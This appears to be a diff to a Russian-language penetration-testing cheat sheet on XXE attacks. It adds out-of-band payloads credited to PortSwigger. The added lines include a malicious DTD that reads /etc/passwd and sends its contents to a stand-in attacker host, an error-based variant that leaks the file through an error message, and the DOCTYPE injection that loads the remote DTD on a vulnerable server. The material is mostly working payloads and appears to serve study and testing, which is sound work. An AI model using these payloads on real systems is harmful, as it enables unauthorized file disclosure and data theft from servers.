@@ -84,7 +84,45 @@
 <data>&send;</data>
 ```
 
-TODO: переделать в oob на ftp сервер
+TODO: переделать в oob на ftp сервер. Это полезно в том случае, если выводимый файл содержит переносы строк (тк они бьют http запрос)
+
+### С PortSwigger
+
+### 1 OOB -> External Server
+
+Полезная нагрузка (malicious.dtd)
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+На уязвимом сервере
+
+```markup
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]>
+```
+
+### 2 OOB via Error
+
+Полезная нагрузка (malicious.dtd)
+
+```markup
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+На уязвимом сервере
+
+```markup
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]>
+```
 
 ## XXE -> RCE
 
